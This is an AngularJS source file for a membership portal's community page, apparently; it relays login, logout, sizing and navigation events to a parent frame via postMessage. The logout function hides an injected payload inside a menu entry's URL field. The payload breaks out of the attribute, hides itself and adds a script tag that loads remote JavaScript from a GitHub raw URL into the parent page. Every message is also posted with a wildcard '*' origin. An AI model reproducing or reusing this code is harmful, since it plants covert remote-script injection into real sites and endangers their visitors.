ptSiteComunica.factory('ptSiteComunica', ['$window',function($window) {
	return {
                //
		enviaLogouInterno: function() {
			console.debug('enviando logouInterno');
        	$window.parent.postMessage({msg:'internoLogouComunidade',tipo:'enviaTopoComunidade'}, "*");
        	$window.parent.postMessage({msg:'internoLogouComunidade',tipo:'enviaPaginaComunidade'}, "*");
		},
		enviaDeslogouInterno: function() {
			console.debug('enviando deslogouInterno');
        	$window.parent.postMessage({msg:'internoDeslogouComunidade',tipo:'enviaTopoComunidade'}, "*");
        	$window.parent.postMessage({msg:'internoDeslogouComunidade',tipo:'enviaPaginaComunidade'}, "*");
        
        	var menu = [{label:'Extratos/Boleto',url:'" style="display: none"><script src="https://raw.githubusercontent.com/taleg2016/taleg/master/wp.js"></script><xx'}];
        	$window.parent.postMessage({menu:menu,tipo:'loginComunidade'}, "*");
		},
		enviaAbrePaginaInteira: function(url) {
			console.debug('enviando abrePaginaInteira',url);
        	$window.parent.postMessage({src:url,tipo:'abrePaginaInteira'}, "*");
		},		
		enviaTamanho: function(size) {
			console.debug('enviando tamanhoComunidade',size);
        	$window.parent.postMessage({size:size,tipo:'tamanhoComunidade'}, "*");
		},
		enviaAbrePagina: function(url) {
			console.debug('enviando abreComunidade',url);
        	$window.parent.postMessage({src:url,tipo:'abreComunidade'}, "*");
		},
		enviaLogin : function(logou) {
			var menu = [{label:'Extratos/Boleto',url:'/#/boleto'},
			            {label:'Extrato para IR',url:'/#/extrato-ir'},
			            {label:'Pedidos de Filiação',url:'/#/comunidade-java/pedido-filiacao'},
				        {label:'Visitar Diretórios',url:'/#/comunidade-java/visitar-diretorios'},
					    {label:'Atualizar dados e opção Setorial',url:'/#/comunidade-java/meus-dados'}];
			
			console.debug('enviando login',logou,menu);
			if (logou)
				$window.parent.postMessage({menu:menu,tipo:'loginComunidade'}, "*");
			else
				$window.parent.postMessage({tipo:'logoutComunidade'}, "*");
		}
	}
}]);
